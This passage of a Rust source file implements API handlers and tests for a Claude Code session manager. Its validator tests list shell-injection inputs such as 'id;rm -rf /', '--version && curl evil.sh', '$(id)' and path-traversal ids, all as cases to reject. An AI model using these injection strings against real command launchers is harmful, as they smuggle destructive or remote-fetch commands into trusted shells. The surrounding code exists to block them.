            return Err(AppError::BadRequest(format!(
                "unknown login action '{other}' (start|method|code|confirm|cancel)"
            )))
        }
    }
    Ok(Json(json!({ "ok": true })))
}

#[derive(Debug, Deserialize)]
struct PeekQuery {
    #[serde(default = "default_peek_lines")]
    lines: usize,
    /// `?ansi=1` → return the capture with its SGR escapes intact instead of the
    /// default ANSI-stripped text. Taken as a raw string rather than a `bool` so
    /// `1`/`true`/`yes`/`on`/a bare `?ansi` all work and an unparseable value
    /// can never 400 a read-only endpoint (it just reads as off).
    #[serde(default)]
    ansi: Option<String>,
}

fn default_peek_lines() -> usize {
    40
}

/// Read a query-string flag the forgiving way: present-and-not-falsey is on. A
/// bare `?ansi` (empty value) counts as on, `0`/`false`/`no`/`off`/whitespace as
/// off.
fn is_truthy_flag(v: &str) -> bool {
    // A bare `?ansi` (no `=value`) is the flag being SET.
    if v.is_empty() {
        return true;
    }
    match v.trim().to_ascii_lowercase().as_str() {
        // A blank value is not an intent; the rest are the usual falsey words.
        "" | "0" | "false" | "no" | "off" => false,
        _ => true,
    }
}

async fn peek_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    axum::extract::Query(q): axum::extract::Query<PeekQuery>,
) -> Result<Json<serde_json::Value>, AppError> {
    // Same envelope for both modes — only the capture channel differs.
    let text = match q.ansi.as_deref() {
        Some(v) if is_truthy_flag(v) => lifecycle::peek_ansi(&state, &name, q.lines).await?,
        _ => lifecycle::peek(&state, &name, q.lines).await?,
    };
    Ok(Json(json!({ "ok": true, "data": text })))
}

/// `PATCH /api/sessions/{name}/seen` — record where the user last read this
/// session, so the cursor follows them across devices (B5/T4).
///
/// The body is exactly B2's `SeenCursor` shape (`attention-tiers.ts`), because
/// this endpoint persists a client model that already exists rather than
/// inventing a second one: `{ ts, count?, epoch? }`, `ts` in server-clock **ms**.
///
/// **Monotonic.** A cursor older than the stored one is a no-op with a 200, not
/// a write and not an error. The scenario that forces this: a laptop tab that
/// has been asleep for an hour wakes, replays its last known cursor, and would
/// otherwise un-read on the phone every session the user has since caught up on.
/// A 200 is right because nothing is wrong — the client's view was simply
/// older, and `advanced: false` tells it so without asking it to handle a
/// failure it cannot act on.
///
/// Authorised by the dashboard bearer like every other session route. The
/// per-session hook token deliberately grants nothing here: hooks report what
/// the AGENT did, and where a HUMAN last looked is not something an agent may
/// assert (`tests/seen_cursor.rs` pins that).
#[derive(serde::Deserialize)]
pub struct SeenInput {
    /// Server-clock milliseconds. Required — a cursor with no position is not
    /// a cursor.
    pub ts: i64,
    /// `chat_tail.entry_count` at that moment, in the seq domain.
    #[serde(default)]
    pub count: Option<i64>,
    /// The chat-store epoch `count` was recorded under.
    #[serde(default)]
    pub epoch: Option<i64>,
}

async fn seen_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<SeenInput>,
) -> Result<Json<serde_json::Value>, AppError> {
    // 404 before the UPDATE, so a typo'd name is distinguishable from a
    // regressive cursor — both would otherwise be "0 rows affected".
    if !db::sessions::exists(&state.pool, &name).await? {
        return Err(AppError::NotFound(format!("session '{name}'")));
    }
    let advanced =
        db::sessions::set_seen(&state.pool, &name, input.ts, input.count, input.epoch).await?;
    Ok(Json(json!({ "ok": true, "data": { "advanced": advanced } })))
}

/// `POST /api/sessions/{name}/restart` — atomic stop→start (rung 2).
///
/// Preserves the conversation, worktree and schedules; destroys the live pty.
/// Exists because two clients composed this differently, and because a composed
/// stop+start leaves a window in which the auto-healer can race the user.
async fn restart_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    let res = lifecycle::restart(&state, &name).await?;
    Ok(Json(json!({ "ok": true, "data": res })))
}

/// `POST /api/sessions/{name}/recover` — the manual holder heal (rung 1).
///
/// Returns the `Heal` outcome as a string so the UI can say WHY nothing
/// happened. Every non-`healed` outcome is a 200, not an error: "auto-heal is
/// off" and "this session type cannot be healed" are ANSWERS, not failures, and
/// modelling them as errors would push them into a generic red toast that says
/// less than the word itself does.
async fn recover_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    let outcome = lifecycle::recover_holder(&state, &name).await?;
    Ok(Json(json!({
        "ok": true,
        "data": { "outcome": outcome.as_str(), "healed": outcome.healed() },
    })))
}

/// `POST /api/sessions/{name}/reset` — a fresh runtime (rung 3).
///
/// Preserves the worktree, schedules and config; destroys the conversation and
/// scrollback. Refuses a RUNNING session with a 409 rather than resetting under
/// a live pty — see `lifecycle::reset` for why that split-brain is worse than
/// the refusal.
async fn reset_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    lifecycle::reset(&state, &name).await?;
    Ok(Json(json!({ "ok": true })))
}

async fn archive_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<impl IntoResponse, AppError> {
    let job_id = lifecycle::archive(&state, &name).await?;
    // Archive returns 202 + job_id immediately.
    Ok((
        StatusCode::ACCEPTED,
        Json(json!({ "ok": true, "job_id": job_id })),
    ))
}

async fn unarchive_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    // Reverse of archive (the overview's Undo). Flips `archived = 0` + emits the
    // `sessions` SSE delta SYNCHRONOUSLY, so it returns 200 once the row is back.
    lifecycle::unarchive(&state, &name).await?;
    Ok(Json(json!({ "ok": true })))
}

// ── permission mode ──────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
struct ModeInput {
    /// The target permission mode: `normal` | `accept_edits` | `plan` | `bypass`.
    mode: String,
}

/// `POST /api/sessions/{name}/mode {mode}` — switch the Claude permission mode.
/// `normal`/`accept_edits`/`plan` cycle in place via targeted Shift+Tab
/// (re-reading the capture, capped retries); `bypass` does a clean relaunch
/// (stop → add the flag → resume). Returns the mode ACTUALLY in effect after
/// the op (the UI reflects truth) + whether it converged / relaunched.
async fn mode_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<ModeInput>,
) -> Result<Json<serde_json::Value>, AppError> {
    let target = status::Mode::from_token(&input.mode).ok_or_else(|| {
        AppError::BadRequest(format!(
            "invalid mode '{}' (expected normal|accept_edits|plan|bypass)",
            input.mode
        ))
    })?;
    let result = lifecycle::set_mode(&state, &name, target).await?;
    Ok(Json(json!({ "ok": true, "data": result })))
}

// ── resume picker ────────────────────────────────────────────────────────────

/// `GET /api/sessions/{name}/resumable` — past Claude conversations for the
/// session's working dir, newest-first. Empty list when the dir has no project
/// folder / no conversations (the picker hides Resume).
async fn resumable_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    let s = db::sessions::get(&state.pool, &name)
        .await?
        .ok_or_else(|| AppError::NotFound(format!("session '{name}'")))?;
    let dir = s.dir.clone();
    // Filesystem scan can touch large transcripts → off the async runtime.
    let list = tokio::task::spawn_blocking(move || resumable::list_for_dir(&dir))
        .await
        .map_err(|e| AppError::Internal(anyhow::anyhow!("resumable scan join failed: {e}")))?;
    Ok(Json(json!({ "ok": true, "data": list })))
}

#[derive(Debug, Deserialize)]
struct ResumeInput {
    id: String,
}

/// `POST /api/sessions/{name}/resume {id}` — set the session's Claude
/// conversation id, then run the existing start path. The launch builder turns
/// `cc_conversation_id` into `claude --resume <id>`, so the session resumes that
/// conversation instead of booting fresh.
async fn resume_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(input): Json<ResumeInput>,
) -> Result<Json<serde_json::Value>, AppError> {
    let id = input.id.trim();
    if id.is_empty() {
        return Err(AppError::BadRequest("expected {id}".into()));
    }
    // Boundary charset check: the id is interpolated into a shell launch line
    // downstream, so reject anything outside `[A-Za-z0-9._-]{1,128}` BEFORE
    // the DB write to keep shell-meta characters out of `cc_conversation_id`.
    if !valid_cc_id(id) {
        return Err(AppError::BadRequest("invalid conversation id".into()));
    }
    // Validate the session exists before touching the row.
    ensure_session(&state, &name).await?;
    db::sessions::set_cc_conversation_id(&state.pool, &name, id).await?;
    let result = lifecycle::start(&state, &name, None).await?;
    Ok(Json(json!({ "ok": true, "data": result })))
}

// ── tracked files ────────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
struct FilesBody {
    files: Vec<String>,
}

async fn tracked_list_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    ensure_session(&state, &name).await?;
    let files = db::tracked_files::list(&state.pool, &name).await?;
    Ok(Json(json!({ "ok": true, "data": { "files": files } })))
}

async fn tracked_add_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(body): Json<FilesBody>,
) -> Result<Json<serde_json::Value>, AppError> {
    ensure_session(&state, &name).await?;
    db::tracked_files::add(&state.pool, &name, &body.files).await?;
    let files = db::tracked_files::list(&state.pool, &name).await?;
    Ok(Json(json!({ "ok": true, "data": { "files": files } })))
}

async fn tracked_remove_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    body: Bytes,
) -> Result<Json<serde_json::Value>, AppError> {
    ensure_session(&state, &name).await?;
    let req: FilesBody = serde_json::from_slice(&body)
        .map_err(|_| AppError::BadRequest("expected JSON body {files:[...]}".into()))?;
    db::tracked_files::remove(&state.pool, &name, &req.files).await?;
    let files = db::tracked_files::list(&state.pool, &name).await?;
    Ok(Json(json!({ "ok": true, "data": { "files": files } })))
}

// ── steering queue ───────────────────────────────────────────────────────────

#[derive(Debug, Deserialize)]
struct SteerBody {
    text: String,
}

#[derive(Debug, Deserialize)]
struct SteerClear {
    id: Option<i64>,
}

async fn steer_list_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
) -> Result<Json<serde_json::Value>, AppError> {
    ensure_session(&state, &name).await?;
    let items = db::steering::list(&state.pool, &name).await?;
    Ok(Json(json!({ "ok": true, "data": items })))
}

async fn steer_add_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    Json(body): Json<SteerBody>,
) -> Result<Json<serde_json::Value>, AppError> {
    ensure_session(&state, &name).await?;
    if body.text.trim().is_empty() {
        return Err(AppError::BadRequest("text required".into()));
    }
    let id = db::steering::enqueue(&state.pool, &name, &body.text).await?;
    Ok(Json(json!({ "ok": true, "id": id, "message": "queued" })))
}

async fn steer_clear_handler(
    State(state): State<AppState>,
    Path(name): Path<String>,
    body: Bytes,
) -> Result<Json<serde_json::Value>, AppError> {
    ensure_session(&state, &name).await?;
    // Body is optional: empty (or unparsable) means "clear all".
    let id = if body.is_empty() {
        None
    } else {
        serde_json::from_slice::<SteerClear>(&body)
            .ok()
            .and_then(|r| r.id)
    };
    let cleared = match id {
        Some(i) => db::steering::clear_one(&state.pool, &name, i).await?,
        None => db::steering::clear(&state.pool, &name).await?,
    };
    Ok(Json(json!({ "ok": true, "cleared": cleared })))
}

// ── unit tests for the pure validators ───────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    /// A statusline snapshot carrying `rate_limits`, as Claude Code sends it.
    fn statusline_with(raw: serde_json::Value) -> chat::statusline::Statusline {
        chat::statusline::Statusline::from_payload(&raw).expect("payload is an object")
    }

    #[test]
    fn rate_limits_reads_both_buckets_and_keeps_claude_codes_units() {
        let s = statusline_with(json!({
            "rate_limits": {
                "five_hour": { "used_percentage": 41.5, "resets_at": 1_755_400_000_i64 },
                "seven_day": { "used_percentage": 77.0, "resets_at": 1_755_900_000_i64 }
            }
        }));
        let r = RateLimits::from_statusline(&s).expect("both buckets");
        assert_eq!(r.five_hour.as_ref().unwrap().used_pct, 41.5);
        // SECONDS, passed through unconverted. A silent unit change here is a
        // countdown wrong by a factor of 1000.
        assert_eq!(r.five_hour.as_ref().unwrap().resets_at, Some(1_755_400_000));
        assert_eq!(r.seven_day.as_ref().unwrap().used_pct, 77.0);
    }

    #[test]
    fn rate_limits_is_absent_rather_than_zero_when_the_payload_has_none() {
        // The documented shape: `rate_limits` is OPTIONAL and absent on a fresh
        // boot. Reporting 0 % for "not reported" would draw a full-headroom
        // gauge for a session nobody has measured.
        let fresh = statusline_with(json!({ "model": { "id": "claude-opus-5" } }));
        assert_eq!(RateLimits::from_statusline(&fresh), None);
        // Present but empty, and present with a bucket that has no percentage:
        // both are "nothing to show", never a bucket with a NaN in it.
        assert_eq!(
            RateLimits::from_statusline(&statusline_with(json!({ "rate_limits": {} }))),
            None
        );
        assert_eq!(
            RateLimits::from_statusline(&statusline_with(
                json!({ "rate_limits": { "five_hour": { "resets_at": 1 } } })
            )),
            None
        );
    }

    #[test]
    fn rate_limits_takes_one_bucket_when_only_one_is_reported() {
        let s = statusline_with(json!({
            "rate_limits": { "seven_day": { "used_percentage": 12 } }
        }));
        let r = RateLimits::from_statusline(&s).expect("one bucket is enough");
        assert!(r.five_hour.is_none());
        assert_eq!(r.seven_day.unwrap().used_pct, 12.0);
    }

    #[test]
    fn peek_ansi_flag_accepts_the_usual_truthy_spellings() {
        // `?ansi=1` is the documented spelling, but a hand-typed `true`/`yes`/a
        // bare `?ansi` must not silently fall back to the plain mode (a silently
        // colourless capture is invisible until a mini-view renders flat grey).
        for yes in ["1", "true", "TRUE", "yes", "on", ""] {
            assert!(is_truthy_flag(yes), "{yes:?} should read as on");
        }
        for no in ["0", "false", "no", "off", "  "] {
            assert!(!is_truthy_flag(no), "{no:?} should read as off");
        }
    }

    #[test]
    fn valid_name_basics_and_leading_dash() {
        // Accept: ordinary slugs plus internal `-`, `.`, `_`.
        for ok in &["a", "alpha", "team_01", "host.local", "abc-def", "A1.b2-c3"] {
            assert!(valid_name(ok), "{ok:?} should validate");
        }
        // Reject: empty, shell-meta, length cap, AND leading `-` (CLI-flag
        // injection guard — `--session-id -evil` would parse as a flag).
        for bad in &[
            "",
            " ",
            "with space",
            "back`tick",
            "slash/x",
            "semi;rm",
            "-leadingdash",
            "-",
            "--double",
        ] {
            assert!(!valid_name(bad), "{bad:?} should reject");
        }
        // Length cap (>100 rejected).
        let too_long: String = std::iter::repeat('a').take(101).collect();
        assert!(!valid_name(&too_long));
    }

    /// `valid_cc_id` accepts the real Claude id shapes (UUIDv4, alphanumeric
    /// + dashes/dots/underscores) and rejects every shell metacharacter that
    /// could otherwise break out of the launch line in `build_launch_command`.
    #[test]
    fn valid_cc_id_charset() {
        // Accept: UUIDv4, plain alphanumeric, dashes/dots/underscores.
        assert!(valid_cc_id("550e8400-e29b-41d4-a716-446655440000"));
        assert!(valid_cc_id("abcDEF123"));
        assert!(valid_cc_id("a.b_c-d"));
        // Reject: every shell-meta char that matters for `--resume <id>`.
        for bad in &[
            "",                 // empty
            "id with space",    // word-split
            "id;rm -rf /",      // command chain
            "id`whoami`",       // backtick subshell
            "id$USER",          // var expansion
            "id'quoted'",       // single quote (our launch-line wrapper)
            "id\"dq\"",         // double quote
            "id|cat",           // pipe
            "id&bg",            // background
            "id\nnewline",      // newline
            // Path-traversal escapes. Harmless as a `--resume` argument, but the
            // A2 chat data plane resolves this id into `<project>/<id>.jsonl`
            // and `<project>/<id>/subagents/`, and `..` walks out of the project
            // dir. Same exclusion `valid_name` already carries.
            ".",
            "..",
            "...",
        ] {
            assert!(!valid_cc_id(bad), "{bad:?} should reject");
        }
        assert!(valid_cc_id("..a"), "dots are still legal INSIDE an id");
        // Length cap (>128 rejected).
        let too_long: String = std::iter::repeat('a').take(129).collect();
        assert!(!valid_cc_id(&too_long));
    }

    // ── runtime seam: the `runtime` column, end to end ───────────────────────

    async fn test_state() -> (AppState, std::path::PathBuf) {
        let dir =
            std::env::temp_dir().join(format!("supermux-runtime-test-{}", uuid::Uuid::new_v4()));
        std::fs::create_dir_all(&dir).unwrap();
        let config = crate::config::Config {
            data_dir: dir.clone(),
            bind: "127.0.0.1:0".parse().unwrap(),
            extra_binds: vec![],
            tls: Default::default(),
            auth_token: "test-token".to_string(),
            provider_defaults: Default::default(),
            ws: Default::default(),
            remote_callback_url: None,
            push_sub: None,
            github_token: None,
            statusline_tap: false,
            extra_origins: Vec::new(),
        };
        let pool = crate::db::init(&config).await.expect("init pool");
        (AppState::new(pool, config), dir)
    }

    fn input(name: &str) -> CreateInput {
        CreateInput {
            name: name.into(),
            display_name: None,
            dir: Some("/tmp".into()),
            desc: None,
            provider: Some("shell".into()),
            creator: None,
            flags: None,
            bypass_permissions: None,
            tags: None,
            branch: None,
            mcp: None,
            worktree: None,
            host_id: None,
            runtime: None,
        }
    }

    /// The column threads CreateInput → NewSession → INSERT → `Session` row →
    /// `SessionView`, and OMITTING it yields `tmux` at every layer (the
    /// zero-behaviour-change default the whole existing fleet lands on).
    #[tokio::test]
    async fn runtime_defaults_to_native_through_the_whole_create_path() {
        // Native is the product default for LOCAL sessions (the tmux-less
        // runtime); remote-host creation defaults to tmux inside `create` (a
        // pty holder is local by definition — branch covered by the explicit
        // native+host rejection test).
        let (state, dir) = test_state().await;
        let view = create(&state, input("plain")).await.expect("create");
        assert_eq!(view.runtime, "native");
        let row = db::sessions::get(&state.pool, "plain").await.unwrap().unwrap();
        assert_eq!(row.runtime, "native");
        assert_eq!(
            db::sessions::runtime_kind(&state.pool, "plain").await.unwrap(),
            Some("native".to_string())
        );
        // …and the resolver hands back the native backend for it.
        let rt = state.runtime_for("plain").await.expect("resolves");
        assert_eq!(rt.target(), "plain");
        assert!(!state.is_tmux_runtime("plain").await);
        crate::sessions::native::forget("plain");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// An EXPLICIT `runtime: "native"` persists and is visible on the API view.
    #[tokio::test]
    async fn explicit_native_runtime_persists_and_surfaces_on_the_view() {
        let (state, dir) = test_state().await;
        let mut inp = input("nat");
        inp.runtime = Some("native".into());
        let view = create(&state, inp).await.expect("create");
        assert_eq!(view.runtime, "native");
        let row = db::sessions::get(&state.pool, "nat").await.unwrap().unwrap();
        assert_eq!(row.runtime, "native");
        assert!(!state.is_tmux_runtime("nat").await);
        // A native session is never a team host — the lead-pane resolver
        // short-circuits without ever forking `tmux list-panes`.
        assert!(teams::resolve_lead_pane(&state, "nat").await.is_none());
        crate::sessions::native::forget("nat");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// `native` + a remote `host_id` is a definitional contradiction (the native
    /// runtime owns a LOCAL pty holder) → 400, and NO row is written.
    #[tokio::test]
    async fn native_plus_host_id_is_rejected_with_400() {
        let (state, dir) = test_state().await;
        let mut inp = input("remote-nat");
        inp.runtime = Some("native".into());
        inp.host_id = Some(7);
        let err = create(&state, inp).await.expect_err("must refuse");
        assert!(matches!(err, AppError::BadRequest(_)), "{err:?}");
        // The message must name the combination, not just "bad request" — this
        // is the refusal the API surfaces verbatim.
        assert!(err.to_string().contains("native"), "{err}");
        assert!(err.to_string().contains("remote host"), "{err}");
        assert!(!db::sessions::exists(&state.pool, "remote-nat").await.unwrap());
        // The refusal is about the COMBINATION: the identical body minus the
        // host_id creates cleanly.
        let mut ok = input("remote-nat");
        ok.runtime = Some("native".into());
        create(&state, ok).await.expect("native without a host is fine");
        crate::sessions::native::forget("remote-nat");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// SEC-01 — the charset rule itself. Pure, so it is pinned without a DB.
    #[test]
    fn flag_validation_names_the_offending_character() {
        // Every flags value this repo stores, plus the ordinary user-typed
        // shapes, must pass — the check may not break a single existing row.
        for ok in [
            "",
            "--yolo",
            "--ask-for-approval never",
            lifecycle::BYPASS_FLAG,
            "--model opus",
            "--model claude-opus-5",
            "--add-dir /opt/projects/supermux",
            "--mcp-config ./mcp.json",
            "--setting model=opus",
            "--permission-mode bypassPermissions --model opus",
        ] {
            assert!(validate_flags(ok).is_ok(), "{ok:?} must stay creatable");
        }
        // The shell-meta surface, refused one character at a time.
        for (bad, ch) in [
            ("--version; touch /tmp/pwned", ';'),
            ("--version && curl evil.sh", '&'),
            ("--version | sh", '|'),
            ("--model $(id)", '$'),
            ("--model `id`", '`'),
            ("--version >/dev/null", '>'),
            ("--model <x", '<'),
            ("--model 'opus'", '\''),
            ("--model \"opus\"", '"'),
            ("--model o\\ pus", '\\'),
            ("--dir *", '*'),
            ("--version\ntouch /tmp/pwned", '\n'),
        ] {
            let err = validate_flags(bad)
                .expect_err(&format!("{bad:?} carries a shell metacharacter — must be refused"));
            assert!(matches!(err, AppError::BadRequest(_)), "{err:?}");
            // The message NAMES the character — the caller composed this string
            // by hand and "invalid flags" would not tell them which byte to drop.
            assert!(
                err.to_string().contains(&format!("{ch:?}")),
                "the 400 for {bad:?} must name {ch:?}: {err}",
            );
        }
    }

    /// SEC-01 end to end at the HTTP boundary: the documented exploit body is a
    /// 400 and writes NO row, so the payload never reaches a launch line at all.
    #[tokio::test]
    async fn create_refuses_flags_that_carry_shell_metacharacters() {
        let (state, dir) = test_state().await;
        let mut inp = input("pwn");
        inp.flags = Some("--version >/dev/null; touch /tmp/pwned; claude".into());
        let err = create(&state, inp).await.expect_err("must refuse");
        assert!(matches!(err, AppError::BadRequest(_)), "{err:?}");
        assert!(err.to_string().contains("launch flags"), "{err}");
        assert!(!db::sessions::exists(&state.pool, "pwn").await.unwrap());

        // The refusal is about the METACHARACTERS, not about sending flags: the
        // same request with a real flags value creates and stores them verbatim.
        let mut ok = input("fine");
        ok.flags = Some("--model opus".into());
        create(&state, ok).await.expect("a plain flags value is fine");
        let row = db::sessions::get(&state.pool, "fine").await.unwrap().unwrap();
        assert_eq!(row.flags, "--model opus");

        // And the typed bypass boolean still appends the trusted flag on top of
        // a caller-supplied one (the composition `create` has always done).
        let mut both = input("both");
        both.flags = Some("--model opus".into());
        both.bypass_permissions = Some(true);
        create(&state, both).await.expect("create");
        let row = db::sessions::get(&state.pool, "both").await.unwrap().unwrap();
        assert_eq!(row.flags, format!("--model opus {}", lifecycle::BYPASS_FLAG));

        for n in ["fine", "both"] {
            crate::sessions::native::forget(n);
        }
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Fake a native session's on-disk state: `<data>/native/<name>/meta.json`
    /// with `pid` (our own pid = "running"; `0` = gone) and, optionally, the
    /// exit marker a holder writes when its child dies.
    fn fake_native_state(dir: &std::path::Path, name: &str, running: bool) -> std::path::PathBuf {
        let sdir = native::spool::session_dir(dir, name);
        std::fs::create_dir_all(&sdir).unwrap();
        std::fs::write(native::spool::spool_path(&sdir), b"scrollback").unwrap();
        let pid = std::process::id();
        native::spool::write_meta(
            &sdir,
            &native::spool::Meta {
                session: name.into(),
                pid: if running { pid } else { 0 },
                cols: 80,
                rows: 24,
                // When that pid REALLY started. The liveness probe checks this:
                // a live pid alone stopped being proof of identity once pid
                // reuse could keep a dead session looking alive.
                started_at: native::runtime::proc_start_unix(pid).unwrap_or(0),
                command: "claude".into(),
            },
        )
        .unwrap();
        if running {
            native::spool::clear_exit(&sdir);
        } else {
            native::spool::mark_exit(&sdir, 0);
        }
        sdir
    }

    /// A native session's spool dir AND its holder's unix socket are keyed by
    /// the session name, and a running holder was told that socket path at spawn
    /// — it can not be moved underneath it. Renaming a RUNNING one used to be a
    /// DB-only write, which orphaned the holder (and the agent inside it) with
    /// nothing attached, forever. It is now a 409.
    #[tokio::test]
    async fn renaming_a_running_native_session_is_refused_with_409() {
        let (state, dir) = test_state().await;
        let mut inp = input("live-nat");
        inp.runtime = Some("native".into());
        create(&state, inp).await.expect("create");
        let sdir = fake_native_state(&dir, "live-nat", true);

        let err = config_patch(
            &state,
            "live-nat",
            ConfigInput {
                rename: Some("renamed-nat".into()),
                display_name: None,
                desc: None,
                dir: None,
                branch: None,
                mcp: None,
                tags: None,
                toggle_pin: None,
                mark_pin: None,
                notif: None,
                toggle_auto_continue: None,
            },
        )
        .await
        .expect_err("a running native session must not be renamable");
        assert!(matches!(err, AppError::Conflict(_)), "{err:?}");
        assert!(err.to_string().contains("stop it before renaming"), "{err}");
        // Nothing moved, nothing was renamed: the row and the dir are intact.
        assert!(db::sessions::exists(&state.pool, "live-nat").await.unwrap());
        assert!(!db::sessions::exists(&state.pool, "renamed-nat").await.unwrap());
        assert!(sdir.exists());

        crate::sessions::native::forget("live-nat");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Stopped, it renames — and the spool dir MOVES with it. Leaving it behind
    /// would strand the scrollback under the old name and let a future session
    /// with that name adopt it.
    #[tokio::test]
    async fn renaming_a_stopped_native_session_moves_its_spool_dir() {
        let (state, dir) = test_state().await;
        let mut inp = input("dead-nat");
        inp.runtime = Some("native".into());
        create(&state, inp).await.expect("create");
        let old_dir = fake_native_state(&dir, "dead-nat", false);

        let view = config_patch(
            &state,
            "dead-nat",
            ConfigInput {
                rename: Some("moved-nat".into()),
                display_name: None,
                desc: None,
                dir: None,
                branch: None,
                mcp: None,
                tags: None,
                toggle_pin: None,
                mark_pin: None,
                notif: None,
                toggle_auto_continue: None,
            },
        )
        .await
        .expect("a stopped native session renames");
        assert_eq!(view.name, "moved-nat");
        assert_eq!(view.runtime, "native");

        assert!(!old_dir.exists(), "the old spool dir must not be left behind");
        let new_dir = native::spool::session_dir(&dir, "moved-nat");
        assert_eq!(
            std::fs::read(native::spool::spool_path(&new_dir)).unwrap(),
            b"scrollback",
            "the scrollback must follow the rename",
        );

        crate::sessions::native::forget("moved-nat");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// Deleting a native session reclaims its on-disk state — otherwise every
    /// deleted session leaves up to `SPOOL_CAP` (64 MiB) behind, and a later
    /// session created with the same name would adopt the dead one's grid.
    #[tokio::test]
    async fn deleting_a_native_session_removes_its_spool_dir() {
        let (state, dir) = test_state().await;
        let mut inp = input("gone-nat");
        inp.runtime = Some("native".into());
        create(&state, inp).await.expect("create");
        let sdir = fake_native_state(&dir, "gone-nat", false);
        assert!(sdir.exists());

        delete(&state, "gone-nat").await.expect("delete");
        assert!(!sdir.exists(), "the spool dir must be removed with the row");
        assert!(!db::sessions::exists(&state.pool, "gone-nat").await.unwrap());
        let _ = std::fs::remove_dir_all(dir);
    }

    /// An unknown runtime kind is a 400 — never silently coerced to tmux, which
    /// would hand the caller a session that is not what they asked for.
    #[tokio::test]
    async fn unknown_runtime_kind_is_rejected_with_400() {
        let (state, dir) = test_state().await;
        let mut inp = input("weird");
        inp.runtime = Some("screen".into());
        let err = create(&state, inp).await.expect_err("must refuse");
        assert!(matches!(err, AppError::BadRequest(_)), "{err:?}");
        assert!(!db::sessions::exists(&state.pool, "weird").await.unwrap());
        let _ = std::fs::remove_dir_all(dir);
    }

    /// `duplicate` carries the runtime kind to the clone — a native session's
    /// copy must not silently become a tmux one.
    #[tokio::test]
    async fn duplicate_carries_the_runtime_kind() {
        let (state, dir) = test_state().await;
        let mut inp = input("src-nat");
        inp.runtime = Some("native".into());
        create(&state, inp).await.expect("create");
        db::sessions::duplicate(&state.pool, "src-nat", "copy-nat")
            .await
            .expect("duplicate");
        let row = db::sessions::get(&state.pool, "copy-nat").await.unwrap().unwrap();
        assert_eq!(row.runtime, "native");
        crate::sessions::native::forget("src-nat");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// The resolver CACHES per session name, and both cleanup paths evict:
    /// `forget_session` (delete) and `rename_session`. A stale handle would keep
    /// addressing the old `supermux-<name>` after a rename.
    #[tokio::test]
    async fn runtime_cache_is_populated_and_evicted() {
        let (state, dir) = test_state().await;
        create(&state, input("cached")).await.expect("create");
        assert!(state.session_runtimes.get("cached").is_none());
        let _ = state.runtime_for("cached").await.expect("resolves");
        assert!(state.session_runtimes.get("cached").is_some());

        state.rename_session("cached", "renamed");
        assert!(state.session_runtimes.get("cached").is_none());

        let _ = state.runtime_for("renamed").await.expect("resolves");
        assert!(state.session_runtimes.get("renamed").is_some());
        state.forget_session("renamed");
        assert!(state.session_runtimes.get("renamed").is_none());
        let _ = std::fs::remove_dir_all(dir);
    }

    /// The identity-mark override round-trips through `PATCH /config`, and a
    /// NULL column changes nothing (fase B2 T8, migration 0027).
    ///
    /// Assignment is DERIVED client-side; this column exists only so an explicit
    /// reroll outlives a reload. So the three things worth pinning are: a fresh
    /// session has no override, a set value comes back verbatim, and an empty
    /// value CLEARS it — the way back to the derived face.
    #[tokio::test]
    async fn mark_pin_round_trips_through_config_and_null_changes_nothing() {
        let (state, dir) = test_state().await;
        create(&state, input("web-ui")).await.expect("create");

        let fresh = get(&state, "web-ui").await.expect("get");
        assert_eq!(fresh.mark_pin, None, "a new session wears its derived face");

        let set = config_patch(&state, "web-ui", mark_pin("wedge:350"))
            .await
            .expect("patch");
        assert_eq!(set.mark_pin.as_deref(), Some("wedge:350"));
        assert_eq!(
            get(&state, "web-ui").await.expect("get").mark_pin.as_deref(),
            Some("wedge:350"),
            "the override is persisted, not just echoed"
        );

        // An unrelated patch must not disturb it.
        config_patch(&state, "web-ui", relabel("Web UI")).await.expect("patch");
        assert_eq!(
            get(&state, "web-ui").await.expect("get").mark_pin.as_deref(),
            Some("wedge:350"),
        );

        // Empty clears — back to the derived face.
        let cleared = config_patch(&state, "web-ui", mark_pin("")).await.expect("patch");
        assert_eq!(cleared.mark_pin, None);
        let _ = std::fs::remove_dir_all(dir);
    }

    fn mark_pin(value: &str) -> ConfigInput {
        ConfigInput {
            rename: None,
            display_name: None,
            desc: None,
            dir: None,
            branch: None,
            mcp: None,
            tags: None,
            toggle_pin: None,
            mark_pin: Some(value.into()),
            notif: None,
            toggle_auto_continue: None,
        }
    }

    /// A row with no `runtime` value on record (a pre-0024 row, or the
    /// test-only `insert_minimal`) reads as tmux everywhere — the backfill
    /// contract the DEFAULT encodes.
    #[tokio::test]
    async fn minimal_insert_backfills_to_tmux() {
        let (state, dir) = test_state().await;
        db::sessions::insert_minimal(&state.pool, "legacy", "/tmp", "shell")
            .await
            .expect("insert");
        let row = db::sessions::get(&state.pool, "legacy").await.unwrap().unwrap();
        assert_eq!(row.runtime, "tmux");
        let rt = state.runtime_for("legacy").await.expect("resolves");
